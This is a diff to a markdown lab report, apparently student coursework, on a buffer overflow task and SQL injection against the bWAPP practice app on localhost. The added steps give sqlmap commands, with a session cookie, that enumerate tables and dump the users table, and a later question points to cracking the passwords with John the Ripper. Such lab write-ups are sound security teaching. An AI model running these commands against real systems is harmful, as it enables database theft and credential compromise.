@@ -1,4 +1,4 @@
-# Task 1: Software buffer overflow attack
+![image](https://github.com/user-attachments/assets/41d8b554-4694-4717-b0b4-6840645aa1a0)# Task 1: Software buffer overflow attack
  
 Given a vulnerable C program 
 ```
@@ -87,6 +87,21 @@ Step 7: Always type y and the terminal show all the databases
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:	
+
+Step 1: Run this code to see all the tables of bWAPP database: sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP --tables --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"
+
+![image](https://github.com/user-attachments/assets/0280a6a8-e771-4df8-b6c4-aa1ece23bbae)
+
+Step 2: Run this code see all the column of users table: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --columns --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"
+
+![image](https://github.com/user-attachments/assets/972a52b4-b243-4366-a157-ad269d6a5530)
+
+Step 3: Run this code to see all records in table user : python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --dump --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"
+
+
+![image](https://github.com/user-attachments/assets/3d8e083d-96d6-4559-9093-5d929c14d623)
+
+
 
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
